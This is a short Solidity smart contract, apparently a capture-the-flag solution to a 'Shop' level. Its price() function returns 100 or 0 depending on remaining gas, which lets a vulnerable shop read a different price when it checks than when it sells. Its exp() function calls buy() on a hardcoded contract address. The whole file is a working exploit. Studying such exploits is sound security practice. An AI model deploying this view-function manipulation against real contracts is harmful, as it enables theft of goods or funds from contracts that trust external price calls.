pragma solidity ^0.8.0;

contract ShopSolver {
    function price() external view returns (uint) {
        //guess work
        if (gasleft() > 2800) {
            return 100;
        }else {
            return 0;
        }
    }

    function exp() external {
        address(0x340C0F451C0E37B55a6BB750D3DA87CcE3954b45).call{value:0, gas: 30000}(abi.encodeWithSignature("buy()"));
    }
}